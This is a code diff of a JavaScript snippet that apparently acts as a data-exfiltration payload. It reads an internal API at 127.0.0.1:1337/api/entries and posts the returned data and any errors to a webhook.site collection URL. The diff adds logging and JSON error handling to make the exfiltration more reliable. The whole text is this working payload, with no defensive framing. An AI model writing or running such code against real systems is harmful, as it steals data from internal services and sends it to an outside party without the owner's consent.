@@ -18,10 +18,14 @@
         // Step 2: Perform GET request to http://127.0.0.1:1337/api/entries
         const response = await fetch('http://127.0.0.1:1337/api/entries');
         
+        console.log('Response status:', response.status);
+        console.log('Response headers:', response.headers);
+
         if (!response.ok) {
           // Step 3: If there is an error, send the error to the webhook
           const errorData = await response.text();
-          await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/error', {
+          console.error('Error Data:', errorData);
+          await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/webhookerror', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
@@ -30,17 +34,30 @@
           });
         } else {
           // Step 4: If the response is successful, send the data to the webhook
-          const data = await response.json();
-          await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/success', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ data: data }),
-          });
+          try {
+            const data = await response.json();
+            console.log('Data:', data);
+            await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({ data: data }),
+            });
+          } catch (jsonError) {
+            console.error('JSON Parsing Error:', jsonError);
+            await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/jsonerro', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({ error: 'JSON Parsing Error: ' + jsonError.message }),
+            });
+          }
         }
       } catch (error) {
         // Handle any error in the fetch process itself and send to webhook
+        console.error('Request failed:', error);
         await fetch('https://webhook.site/2f8dcd8e-c909-4391-9b93-138dd6abc1ee/error1', {
           method: 'POST',
           headers: {
